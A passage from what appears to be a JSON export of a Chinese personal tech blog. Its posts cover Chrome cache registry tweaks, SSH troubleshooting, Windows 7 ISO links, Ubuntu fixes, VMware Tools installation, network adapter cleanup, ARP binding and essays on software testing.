5.00[HKEY_CLASSES_ROOT\\ftp\\shell\\open\\command]@=C:\\Users\\用户名\\AppData\\Local\\GoogleChrome\\Application\\chrome.exe --disk-cache-dir=&quot;R:\\chromecache -- %1[HKEY_CLASSES_ROOT\\http\\shell\\open\\command]@=C:\\Users\\用户名\\AppData\\Local\\GoogleChrome\\Application\\chrome.exe --disk-cache-dir=&quot;R:\\chromecache -- %1[HKEY_CLASSES_ROOT\\https\\shell\\open\\command]@=C:\\Users\\用户名\\AppData\\Local\\GoogleChrome\\Application\\chrome.exe --disk-cache-dir=&quot;R:\\chromecache -- %1[HKEY_CLASSES_ROOT\\Chrome\\HTML\\shell\\open\\command]@=C:\\Users\\用户名\\AppData\\Local\\GoogleChrome\\Application\\chrome.exe --disk-cache-dir=&quot;R:\\chromecache -- %1 以上注册表请复制根据实际情况修改后保存为reg文件,然后导入即可实现从其他程序调用时也实现缓存保存至内存盘. 要实现点击chrome快捷缓存指向内存盘,请在chrome快捷上右键&gt;属性&gt;快捷/shortcut&gt;,在快捷后面加上: 1--disk-cache-dir=&quot;R:\\chromecache&quot; #&quot;--&quot;前有个空格 其他设置我就不写了,以前转过别人一个文章:让32位系统用尽4G内存–RAMDISK使用详解（转载）","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"The remote system refused the connection解决办法","slug":"the-remote-system-refused-the-connection","date":"2016-04-05T06:15:29.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"the-remote-system-refused-the-connection.html","permalink":"https://sobaigu.com/the-remote-system-refused-the-connection.html","excerpt":"","text":"重装了个系统,再次用secureCRT去远程连接搬瓦工的VPS时,出现: The remote system refused the connection. 本能地以为是系统中ssh服务不正常,或者被防火墙给墙掉了,想着这VPS也运行快两百天了,先重启下看看吧,毕竟这段时间我啥也没做. 可重启回来问他依旧,搬瓦工官网还刚好打不开,各种折腾,最后查看sshd_config发现,原来是端口错了,不是默认的22端口,o(╯□╰)o… 虽然没什么问题,还是把解决这问题的思路整理下,以供自己记录及他人参考. 确保客户端没问题 使用远程工具连接时,先检查下本地客户端和服务端的配置是不是对上了,比如端口,协议,ip地址这些.都是些细节问题. 确保服务器上的ssh服务正常 刚安装的系统,有些默认是不会安装ssh服务的,没安装或者安装了但没启动服务的时候,报错提示也同样是连接被拒绝,这个时候需要自己安装ssh server服务: 12345678910yum install openssh-server[root@xxxx ~]# cat /etc/ssh/sshd_config# $OpenBSD: sshd_config,v 1.80 2008/07/02 02:24:18 djm Exp $# This is the sshd server system-wide configuration file. See# sshd_config(5) for more information.# activation of protocol 1Protocol 2PermitRootLogin yesPort 22 修改iptables或者关闭防火墙功能 iptables我也不会,都是要用的时候照着文档一步步操作,排查问题的时候简单粗暴点就可以了,确定了你再细细研究: 1[root@sobaigu.com ~]# service iptables stop 将sshd设置为随系统自启动 123[root@xxxx ~]# chkconfig sshd on[root@xxxx ~]# chkconfig | grep sshdsshd 0:off 1:off 2:on 3:on 4:on 5:on 6:off","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Windows7 SP1官方原版系列下载","slug":"windows7-sp1-download","date":"2016-03-17T15:50:03.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"windows7-sp1-download.html","permalink":"https://sobaigu.com/windows7-sp1-download.html","excerpt":"","text":"点击超链接下载,或者复制链接地址粘贴至电驴下载即可. 由于WordPress的限制,电驴链接过长而无法自动换行,造成链接显示不全. 如果要复制链接,请在超链接上右键&gt;复制链接地址即可. 英文旗舰版:64位 1ed2k://|file|en_Windows_7_ultimate_with_sp1_x64_dvd_u_677332.iso|3320903680|743598C64E635C72964CF02A3E0AD547|/ 英文旗舰版:32位 1ed2k://|file|en_Windows_7_ultimate_with_sp1_x86_dvd_u_677460.iso|2564476928|2593E390556C6CCB8630EDB599D57881|/ 简体中文家庭版:32位 1ed2k://|file|cn_Windows_7_home_basic_with_sp1_x86_dvd_u_676500.iso|2653276160|843E7A78F2126FAC726CF5342710082D|/ 简体中文旗舰版:64位 1ed2k://|file|cn_Windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 简体中文旗舰版:32位 1ed2k://|file|cn_Windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso|2653276160|7503E4B9B8738DFCB95872445C72AEFB|/ 繁体旗舰版:64位 1ed2k://|file|hk_Windows_7_ultimate_with_sp1_x64_dvd_618544.iso|3390910464|BE5F84D28F5DA939EEFDB9498D4F986D|/ 繁体旗舰版:32位 1ed2k://|file|hk_Windows_7_ultimate_with_sp1_x86_dvd_618761.iso|2621298688|061B09601AEA348D2658A3AB970D8E80|/","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"解决Ubuntu登陆提示:unlock login keyring","slug":"solve-ubuntu-unlock-login-keyring","date":"2016-03-07T15:48:35.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"solve-ubuntu-unlock-login-keyring.html","permalink":"https://sobaigu.com/solve-ubuntu-unlock-login-keyring.html","excerpt":"Ubuntu下提示：unlocklogin keyring解决办法 用笔记本装Ubuntu或者其他发行版本的同学可能都遇到这么个问题，每次登录系统都会提示enter password to unlock your login keyring，虽说Linux下安全做得不错，但事物总是有两面性，像咱这样从Windows转过来的用户，懒惯了，倒是希望Ubuntu能给我个选项，让这个该死的对话框不自动弹出来。","text":"Ubuntu下提示：unlocklogin keyring解决办法 用笔记本装Ubuntu或者其他发行版本的同学可能都遇到这么个问题，每次登录系统都会提示enter password to unlock your login keyring，虽说Linux下安全做得不错，但事物总是有两面性，像咱这样从Windows转过来的用户，懒惯了，倒是希望Ubuntu能给我个选项，让这个该死的对话框不自动弹出来。 在度娘里搜索解决答案，多数人都是照抄，都说seahorse重新设置默认密码，fuuuck！！！也不知道多少人真的解决了这问题。反正我这根本没效果，本人亲测。 研究发现，这个对话框其实是系统设置了用户自动登录，登录的时候开启了无线自动连接，据说这个对话框其实是为无线安全而弹出来的,也就是说当你在某个无线环境设置好后,再换个环境,需要对新环境重新设置,我们的目标是一个环境只需要设置一次。（最新版本的Ubuntu已经解决这问题） 具体情况未作验证，最终解决方法便姑且是从无线连接入手，死马就当活马医吧，不花钱，咱就是这样折腾来的。在右上角连接图标上单击或者在系统管理中找到网络连接管理程序》edit connection》填入安全验证密码解锁》wireless》点右边的edit》注意左下角，available to all users将对所有用户有效勾选上，关闭保存，重启实验下是不是有效果。 如果处于不可选状态，可以将此无线连接删除，重新连接，再重复以上操作，应该ok了再不行哥还有另外一招o(∩∩)o…哈哈。 这个密码其实是保存在~/.gnome2/keyrings$下面，网上有个解决方法是将下面保存的密钥删除，测试证明那是治标不治本的，删除后只是不再连接无线的情况下有效，如果再次连接，还将出现同样的提示，所以这种解决方案是误传。 Right click your wireless (Network Manager) icon in the tray and click Edit Connections. Click the Wireless tab, highlight your wireless connection, then click Edit. At the bottom there is a checkbox called “Available to all users”. Click it then click Apply to save your change. It will ask for your password because it is a system-wide change, but that’s it! You, or anyone else you make an account for can now log on and get the wireless connection without anyone having access to your (unencrypted) passwords. 可能你那经过以上折腾还不奏效，那就继续看下面的方法吧，也简单，看右图。这个图怎么来的？ 我用的是Ubuntu11.04，unity界面，刚开始有点不习惯，现在觉着挺好。按command键弹出程序选择界面，在搜索框输入：user，应该可以看到users and group在下面了，没错，就选择它，然后你就看到我上面的截图了，其他版本的也一样，找到用户和组管理程序就好了，然后把不需要密码登录勾选上，再实验下是否哦拉(user settings&gt;password&gt;click change&gt;select don’t ask for password on login)。我这用的就是这种方法，朋友们最终怎么解决的可以跟大家一起晒晒。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"无线路由禁止蹭网解决方案","slug":"wifi-with-none-stealer","date":"2016-03-02T15:48:36.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"wifi-with-none-stealer.html","permalink":"https://sobaigu.com/wifi-with-none-stealer.html","excerpt":"","text":"如何防止无线路由器被蹭网？断网很久了，现在实在受不了，还是把网络开通了。 还是使用了无线路由，这个无线路由信号不怎么稳定。本来网速就慢，就不要让人家再来蹭网了吧。 自己也曾经蹭过别人的网，额，还是做点工作防蹭吧，让那些什么卡皇卡王报废掉。卡皇和卡王之类的无非就所破解密码，咱可以换个高级点的加密方式，密码复杂点，随他破去。当然，也可以绑定mac，白名单机制等，本想写个图文教程，网上搜了一把，已经有不少这样的教程了，找了个比较详细的，咱就发挥下拿来主义，o(∩∩)o…哈哈。 大片文字也懒得贴了，给个索引。 1、采用WPA/WPA2-PSK加密 2、增加MAC地址过滤 3、修改内部IP设置（选用） 图文见原文链接：http://www.wi-gadget.com/2009/06/06/62349/","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"英文locate下gedit打开中文文档乱码及中文输入法解决办法","slug":"ubuntu-en-locale-gedit-can-not-open-chinese-doc","date":"2016-02-26T15:48:31.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"ubuntu-en-locale-gedit-can-not-open-chinese-doc.html","permalink":"https://sobaigu.com/ubuntu-en-locale-gedit-can-not-open-chinese-doc.html","excerpt":"","text":"本人装的Ubuntu为纯英文，且没有安装中文语言支持。 这样一来默认打开中文文档是会有乱码的，我们需要对gedit添加对中文编码的支持，常用GB18030. 步骤 按ctrl+alt+t呼出终端shell界面，输入gconf-edit，回车，将打开配置编辑器，点开apps》gedit-2》perferences》encoding： 右边选项逐个双击打开设置，添加GB18030，并将其排列到最顶上位置，退出配置编辑器，再打开中文文档，一切ok。 在此需要注意一点，不要用sudo gconf-edit打开配置编辑器，否则虽然gb18030已经添加了，但打开中文文档还所乱码，这地方我之前没注意，结果适得其反。 关于中文输入法 英文local下默认所没有中文输入法的，只有安装了中文语言支持后此会默认装上拼音等输入法。 不过不装语言支持也没关系，Ubuntu11.04中系统其实已经带了中文输入法的。当然，也可以装其他的输入法，如以前很喜欢的小企鹅fcitx输入法，但升级到11.04后不管所源码编译安装还是ppa源安装，最后折腾完了无法启动，不知道为什么，还要等高人指点。 在fcitx暂时无法用的时候，用系统自带的或者搜狗或qq云输入法替代都不错，系统自带输入法需要添加下： 按super键（一般计算机上都所印个Windows徽标，mac上为command键）呼出程序选择界面，搜索ibus，可以找到keyboard input methods，点击后会提示没有启动，点是启动，然后点第二个标签input method》select a method》chinese添加拼音，想输入中文的时候按ctrl+空格，ok，用得还是不错，至少比Windows下的智能abc好用多了吧。 嫌每次这样麻烦，那么就将ibus添加为随系统自启动。方法为：按super键弹出程序管理界面，搜索start，点击start applications，添加command为/usr/bin/ibus-daemon，这里注意，一定要填绝对路径，否则可能会出现开机起不来的情况，显示标题及注释自己随便填啦，能看懂就行。 其他说明 最新版本的Ubuntu已经不是用gconf-edit配置了,所以解决方法请搜索本站: Ubuntu11.10之后版本英文locate下gedit汉字乱码问题解决办法","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"写给测试新手","slug":"to-new-tester","date":"2016-02-06T15:49:03.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"to-new-tester.html","permalink":"https://sobaigu.com/to-new-tester.html","excerpt":"","text":"作者：Randall W.Rice, CSQA, CST, CSTM 翻译：skinapi 前言 因为已经带领和训练测试团队多年，所以按惯例我总有些东西确定需要传达给测试新手。不管你是一个测试新手还是一个经验丰富的测试专家，都有不少有益的东西需要牢记在心。 你是一个检查者，你不需要为质量负责 很多测试人员误入歧途，不明白他们是评测产品的而不是控制产品的。这两者之间有着天壤之别。例如，一个测试团队花费好几周时间测试并发现很多缺陷，只是为了看着管理层决定发布一个有已知严重缺陷的产品。测试团队经常会感到士气受挫，置疑他们测试的目的。 我询问团队中的成员他们是否被支付薪水了，通常得到的回答都是“是”。我又询问他们是否尽力去做工作了，再一次，通常得到的回答都是“是”。我于是告诉他们，“你们做了你们的工作。你们尽力测试，发现了缺陷并进行了上报。那么现在可以回家休息了。实际上，作为一名测试人员唯一失败的地方是不上报一个已知的缺陷。” 这不会提高士气，但却有助于事情向正确的方向发展，特别是能让人不用每天晚上都在家接着办公。 很 多测试人员，包括我，当我们刚开始测试工作时，似乎会觉得自己对我们所测试的系统应用的质量负责。尽管这个工作的出发点是让人钦佩的，可实际上我们测试人 员对于产品的质量基本没有控制能力。也是由于这个原因，测试人员不为质量负责。现在问题是管理层并不总是能看到这种区别。所以经常看见管理层提出类似于 “我们付钱给这些人不是为了获得高质量的软件吗？”的问题。 缺陷都是有价值的 每一个缺陷都是深入了解和提高的机会。我们可能只有一次机会观察到一个缺陷，所以我总是告诉测试人员始终保持高度注意力，不要为测试的乏味所折磨。 缺陷信息可能是可获取的项目数据中最有效的资源之一。但是这都取决于我们能多好的捕捉和传达我们所发现的缺陷的相关信息。 每个缺陷都会花费整个组织的金钱。如果我们不能从中更进一步了解产品，我们会浪费大量时间和金钱。当我们把一个错误转换成一次深入了解的机会时杠杆作用就出现了。让我们面对它――有些教训只能通过经历来学习的。 由于一个缺陷而责备谁不会有任何好的作用。责备只会让士气低落、沟通中断。这就像不断鞭打一匹死马希望它能活过来一样。 你报告第一个问题之前一切都是美好的 这就是一个测试人员所面对的现实。你可以计划测试，获取所需要的资源，看起来所有人都站在你这边。可当你报告第一个问题之后，事情就开始变得紧张了。 出现这种态度上的突然变化的原因是现在你在批评某些人的工作了。自尊心使得自我收到伤害，关系变得紧张。有些情况下自尊心是值得期盼的，只要知道当你开始发现问题的时候态度有可能变化就可以了。 我经常建议测试人员做的一件事是读一读一些你过去写的缺陷报告，假设自己是接收缺陷报告的人。你会发现自己需要更老练一些。写一个没有任何挖苦语句的缺陷报告可能没什么乐趣，但它的确有助于和开发人员之间保持一个好的关系。 只能测试你能观察的 你可能总想测试一些真正有创造性的用例，但如果你没有办法观察到结果，那有什么意义？尽管有些应用让你能观察到很多，但仍然有你没办法接近的，例如结构、隐藏的对象、后台进程等。 别忘记你是怎样到一个地方的 我不是在谈论知道为什么你走进一个房间，而是在测试时执行的步骤。对于测试新手常见的是发现了一个重大的缺陷，但却无法复现它以便定位解决。这样你只会觉得不舒服，不知道自己到底是真发现了一个缺陷，还是说仅仅是错误的使用了应用。 你能用来跟踪你的测试步骤的方法有测试脚本、测试记录、敲键记录器如Spector和屏幕视频捕捉工具如Hypercam。 标准和流程是你的朋友 尽管标准和流程让一些人觉得受限，但它们为你的工作提供了有价值的指导。不要拒绝标准因为它们是详细的、具体的。因此用它们指导自己更快、更一致的完成自己的工作。 没有足够的时间用于测试 几乎每一个测试人员都抱怨没有足够的时间用于测试，但实际情况是测试任何东西到完整的程度都是不可能有充足时间的。当你充分考虑软件的特性如可用性、安全性、兼容性、互操作性等时这一点尤其正确。 不要再抱怨缺少时间，学会根据风险来进行优先级排序，把注意力都放在对管理层很重要的应用目标上。有时候我们测试的内容超出了我们需要测试的，因为我们的目标偏离了产品的价值。 你不可能发现所有的缺陷 如果你测试的东西后来有缺陷被发现，不要变得气馁。你可能已经做了非常全面的工作，获得了高水平的缺陷移除，但100%都是不可能的目标。 保持幽默感和对前景充满信心 经常微笑、保持健康可能是你最好的生存方式。如果你正处在困难条件下，请相信，这一切都将过去。 争取做到最好而不是完美 测试新手经常会陷入追求完美的过程中，认为100%的正确才是标准。我曾经也是受害者之一，但要为自己辩护的是，我以前深受80年代后期类似于99.9%还不够好”的TQM帖子和文章的影响。 追求完美的问题在于它会让测试进程变慢，将担心引入你所做的一切，使得你对别人更挑剔，而且通常会让你的朋友和家人感到失望。 当然，没人愿意犯错误，但他们稍不注意就出现了。想不犯错误就是否认现实。争取做到最好是一种好的习惯，表明你对工作的态度和投入程度。如果你想努力做到最好，你就会往前再多走一点。 根据我的观察，大多数人看到错误或者经历失误时都是很宽容的。人们最关心的是你对待问题的反应。 开发人员不是敌人 需 要整个项目团队的努力才能递交高质量的产品。有时候似乎开发人员不太关心质量，这个时候事情背后可能存在隐情。这时候你需要更好的和开发人员合作而不是反 对他们。要始终牢记良好的交流是一个项目成功的关键因素。当你和开发人员站到对立面时，交流就停止了，你测试所需的很多信息也无法获取了。 建立和维护一个私人的交际网 你的私人和工作关系是一个很重要的资产。无论时当你有工作时还是当你没工作时他们都是一个很好的支持系统。找一个好的指导者，而当你学到足够的东西时成为别人的指导者。 持续锻炼自己的技能 你的技能把你和别人区分开。始终通过参加专业会议、获取认证、阅读专业资料等来不断学习。我给自己制定的目标是每周至少读一本和个人发展以及职业发展相关的书（测试、领导艺术、商业、IT等）。 一个个人发展方面的专家说过如果你每天在任何特定的主题上花费30分钟进行阅读，五年之内你肯定能成为这个主题方面的专家。这一点对我是起作用的――你也可以试试。 另一种让自己始终内行并建立网络的好的方式是活跃在一些QA或者测试论坛上。 当前进变得困难，懒惰就需要创造力了 当我第一次成为一个测试团队负责人时，我用这句话做了一个字条挂在我的桌上。它不断提醒我把创造力作为我解决问题的一个杠杆。 学着从一个新的有创造性的方式来看待问题。你可能有一个好的测试计划，但你如何应付各种变化呢？弹性是一个优秀的问题解决负责人的关键特性。 简单并不总是很容易 我们测试中做的很多工作看起来都很简单。但是，挑战在于保持努力的连贯性。 有些解决问题的方式刚开始看起来很简单，但不要由于它简单和明显就丢弃任何一种想法。同样，不要低估实现一个简单想法所需要付出的努力。 一些看过我和William E.Perry合著的书“Surviving the Top Ten Challenges of SoftwareTesting”评论说这些挑战都很简单且很容易解决。这就让我奇怪为什么人们还在年复一年的提出“人的问题”。我认为在大脑中产生想法比实际实现出来要简单的多。 结论 智慧比知识更重要。你可能已经学习了大量测试技术，但如果你没有足够的智慧判断什么时候采用它们，没有从整体上理解它们，你应用它们的能力将受到很大限制。对任何都有涉猎的你存在的一个问题是“你不知道什么你不知道”。智慧帮助你明白你需要知道哪些东西才能成功。","categories":[{"name":"瞎逼逼","slug":"瞎逼逼","permalink":"https://sobaigu.com/categories/%E7%9E%8E%E9%80%BC%E9%80%BC/"}],"tags":[{"name":"江湖","slug":"江湖","permalink":"https://sobaigu.com/tags/%E6%B1%9F%E6%B9%96/"}]},{"title":"测试任职资格考核后的思考总结","slug":"tester-manager-reflect","date":"2016-02-01T15:49:00.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"tester-manager-reflect.html","permalink":"https://sobaigu.com/tester-manager-reflect.html","excerpt":"","text":"本次考核来得比较突然,也来得比预期的早得多,可以说是猜中了开头,没想到结尾. 被考核后总体而言是失败的,也暴露出相当多的问题.除去专业知识及技能考虑,这些暴露出来的问题中很大一部分其实是我们不愿做或者没有形成习惯导致. 实际上从本次考核内容来看,真正测试专业性的东西比较少,或者根本就不会深入,考核的更多的是平常工作中的积累,业务知识积累,劳动成果积累,测试思路积累及处事方法积累. 有积累就需要展示,除了口述我们的处事行为,方法,更多的我们需要出示让人看得见的东西,那便是文档+案例,而这些可以说我们中间没几个人是做得足够的,希望大家从今往后自己主动收集,有序整理,我们需要养成这种工作习惯.这些工作可能会增加我们的工作量,但对团队,对个人都是有益无害的事情,初期可能需要新建或者制作,请大家克服当前,想想我们的qc上相关东西,现在和半年前相比,效果已经体现出来了,等完善后修改起来就应该就不像现在这般困难. 这次我大略总结,我们严重不足的并且可以做的有以下几点: 编写测试计划 虽然当前我们所谓的测试用例相比半年前已经有了很大的进步,但大家应该都很清楚,那些东西是经不起检验的. 有空大家翻出自己写的测试用例看看,也许自己都看不懂.当初为什么这样写,这样写的目的是什么,照这个测试用例去执行是否能执行下去?我们很多任意操作描述和留空白是没有差别的,最好我们能写上具体需要鼠标键盘操作什么,竞争对手要做什么.这也是个长期的过程. 由于流量产品线的特殊性,我们写的东西基本上没人能帮忙审阅,也没有时间给咱组织评审,在测试用例编写或者完善过程中我们可以征求研发意见,并体现在测试用例中,这个也是考核的内容之一. 测试总结/缺陷分析 这块我们几乎是没有做,甚至是发生事故之后也没有进行总结过,责任首先在我,但我们还是有必要着手做. 起步阶段我们可以在做完一个项目后将缺陷总结归类下,回头看看这些发现的缺陷是怎么发现的,有多少不是通过执行明确的测试用例发现的,为什么没有写进测试用例?缺陷都集中在什么地方,什么操作容易导致问题? 总结后预期结果应该是再次审视我们的测试用例时能够发现用例不曾覆盖的部分并使测试用例越来越完善.测试过程中能够针对以往缺陷集中的地方更加关注,更加详尽进行测试. 缺陷反馈/项目进度通报 此工作我们偶尔做,但还做得不够.不要求每天做,但当出现影响项目进度缺陷时我们需要让运营让领导知道,毕竟出现这些事件时会让测试工作量陡增甚至翻倍,最后项目延期运营还有点不乐意. 从今日做起,有缺陷有可能导致项目延期的事件请通过文档,通过邮件反馈出来,有项目完成而运营无安排时一样的通过邮件告知测试完成并提供测试报告. 文档积累 我们都做了不少事情,但我们甚至拿不出证据,有时连自己都想不起来,这就是问题,因为自己没有记录. 所以,大家做了就记录吧,最好都是电子文档或者邮件,有一天会用得到,别人也可以用得到. 测试工具 这个就不多说了,大家都知道纯手工测试是没前途的.在没办法不做测试前大家还是慢慢开始学吧,搞通了能用于现在的插件测试最好,一点用不上也没关系,学到的东西是自己的. 就这么多吧,大家对我们当前的工作有什么想法或者对我们现在的小团队有什么想法和建议可以提议讨论下.","categories":[{"name":"瞎逼逼","slug":"瞎逼逼","permalink":"https://sobaigu.com/categories/%E7%9E%8E%E9%80%BC%E9%80%BC/"}],"tags":[{"name":"江湖","slug":"江湖","permalink":"https://sobaigu.com/tags/%E6%B1%9F%E6%B9%96/"}]},{"title":"Ubuntu下安装vmware tool","slug":"ubuntu-install-vmware-tool","date":"2016-01-22T15:49:32.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"ubuntu-install-vmware-tool.html","permalink":"https://sobaigu.com/ubuntu-install-vmware-tool.html","excerpt":"","text":"刚开始接触Linux,一般都是在虚拟机下熟悉.Windows下常用的虚拟机软件莫非就是vpc和vmware了,而个人更喜欢vmware. 往虚拟机里放文件常常通过局域网共享或者ftp传送,这都比较麻烦,vmware提供了vmware tool,以便宿主机和虚拟机之间剪贴板共用,文件拷贝粘贴及拖拉传送文件的功能. vmware tool在Windows下安装很简单,把vmware带的Windows.iso挂到虚拟机光驱中打开双击setup就完事了,在Linux下稍微麻烦点,但都有向导提示,也不算太难. 第一步:当然是开启你的虚拟机咯.将vmware带的Linux.iso挂载到虚拟机的光驱中,一般会自动挂载出来并在桌面显示出光驱图标. 第二步:打开终端,cd命令切换到光驱路径,使用tar -zxvf将其解压到某个地方,如解压到~/,解压完再用cd vmware-tools-distrib/命令切换到vmware tool安装文件目录. 第三步:看下都有啥文件咯 123zzz@zzz-Ubuntu:~/vmware-tools-distrib$ lsbin doc etc FILES INSTALL installer lib vmware-install.pl 很明显,vmware-install.pl是安装脚本,不放心可以用file vmware-install.pl命令查看下 第四步:运行安装脚本 12345678zzz@zzz-Ubuntu:~/vmware-tools-distrib$ sudo ./vmware-install.plCreating a new VMware Tools installer database using the tar4 format.Installing VMware Tools.In which directory do you want to install the binary files? [/usr/bin]What is the directory that contains the init directories (rc0.d/ to rc6.d/)? [/etc]...... 这些设定一般默认就看好了,一路回车. 最后完成后进入编译安装阶段: 1234567Using 2.6.x kernel build system.make: Entering directory `/tmp/vmware-root/modules/vmmemctl-only&#x27;make -C /lib/modules/2.6.32-28-generic/build/include/.. SUBDIRS=$PWD SRCROOT=$PWD/.MODULEBUILDDIR= modulesmake[1]: Entering directory `/usr/src/Linux-headers-2.6.32-28-generic&#x27; …大概几分钟就编译安装完成了,安装完成后将会提示: 1234567891011To use the vmxnet driver, restart networking using the following commands:/etc/init.d/networking stoprmmod pcnet32rmmod vmxnetmodprobe vmxnet/etc/init.d/networking startEnjoy,--the VMware team 有时候可能没想好,vmtool安装错误,开始安装后又终止了,按control+c啥的,最后按了control+z退出,再 ./vmware-install.pl就有错误提示无法继续安装,此时请到bin目录下去找一个 ./vmware-uninstall.pl执行即可. 安装完成,试试剪贴板是不是可以共用了?要往里面拖文件,那就将虚拟机重启一把吧,有木有?有木有??? 将安装文件删除吧,节省点空间 1zzz@zzz-Ubuntu:~$ rm -rf vmware-tools-distrib/","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"解决chrome安装扩展失败问题","slug":"chrome-extend-install-error","date":"2016-01-17T15:48:36.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"chrome-extend-install-error.html","permalink":"https://sobaigu.com/chrome-extend-install-error.html","excerpt":"","text":"chrome是个好东西,之前是firefox迷,现在也完全转移到chrome了. chrome吸引人的地方除了干净整洁,与firefox同样强大的就是其扩展插件.但n久前折腾chrome扩展时发现安装失败,提示貌似是&quot;unzip error…&quot;,google了半天也没找到解决办法. 后来自己回想了下,之前安装是很正常的,自从装了superspeed后就发现安装扩展时提示无法解压.但本人另外一个机器也装了此软件,并未出现同样的问题. 再细想,因为这个机器内存比较大,我把系统的temp环境变量也指向superspeed划出的内存盘中了,会不会是这个有影响? 想到就试,把系统环境变量改为c盘路径,重启机器,再次安装,一切顺利!! 到今日,chrome已经升级到10.0.648.204版本了,此问题已经解决. 特留此文,以示纪念.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"删除多余网卡/本地链接","slug":"drop-lan-link","date":"2015-12-23T15:49:54.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"drop-lan-link.html","permalink":"https://sobaigu.com/drop-lan-link.html","excerpt":"","text":"方法一：注册表查找删除 依次选择开始→运行，在运行对话框中输入regedit，打开注册表编辑器，然后查找“本地连接”关键字，查找到的项值只保留最近的“本地连接”项，其他的“本地连接”项一律删除，最后退出注册表编辑器，那么先前的虚拟网卡就会从你的电脑中被彻底删除掉了。 不想查找的话，展开到以下注册表位置: “HKEY_LOCAL_MCHINE\\SYSTEM\\CurrentControlSet\\Control\\Network{4D36E972-E325-11CE-BFC1-08002BE10318}” 在该项下面保存着关于本地连接的信息。在此有一个或多个子项，一般情况下其中第一个子键对应着“本地连接”，第二个子键就对应着“本地连接2”依此类推，你也可以展开该子键，再选择下面的Connection子键，在右侧窗口中将会看到具体是对应着哪个连接，直接将对应以前旧连接的整个子键删除即可。 方法二：设备管理器删除 在运行对话框中输入cmd命令打开“命令提示符”窗口，先输入命令set devmgr_show_nonpresent_devices=1，回车后再输入命令start devmgmt.msc即可打开“设备管理器”，在“设备管理器”的菜单栏上选择查看→显示隐藏的设备命令，即可看到隐藏的虚拟网卡，双击该虚拟网卡打开网卡的“属性”对话框，切换到“驱动程序”选项卡，单击“卸载”按钮，该虚拟网卡即被删除。 打开设备管理器的方法还有: 1.在&quot;我的电脑&quot;上右键&gt;管理&gt;往下就看到设备管理器了; 2.&quot;我的电脑&quot;上右键&gt;属性&gt;硬件标签&gt;设备管理器","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"win7及Linux下arp绑定","slug":"win7-linux-arp-mac","date":"2015-12-13T15:48:54.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"win7-linux-arp-mac.html","permalink":"https://sobaigu.com/win7-linux-arp-mac.html","excerpt":"","text":"Windows7下arp绑定【原创】 1234567891011121314151617181920212223242526272829303132333435C:\\Users\\&gt;arp -aInterface: 192.168.1.100 — 0x14Internet Address Physical Address Type192.168.1.1 00-21-27-51-af-a4 dynamic #当前为动态的224.0.0.251 01-00-5e-00-00-fb staticC:\\Users\\&gt;arp -s 192.168.1.1 00-21-27-51-af-a4 #此命令在vista和Windows7下是禁止的The ARP entry addition failed: Access is denied.C:\\Users\\&gt;netsh -c “interface ipv4”netsh interface ipv4&gt;show neighbors #查看下arp缓存Interface 1: Loopback Pseudo-Interface 1Internet Address Physical Address Type——————————————– —————– ———–224.0.0.251 PermanentInterface 11: Wireless Network ConnectionInternet Address Physical Address Type——————————————– —————– ———–224.0.0.251 01-00-5e-00-00-fb PermanentInterface 20: Local Area ConnectionInternet Address Physical Address Type——————————————– —————– 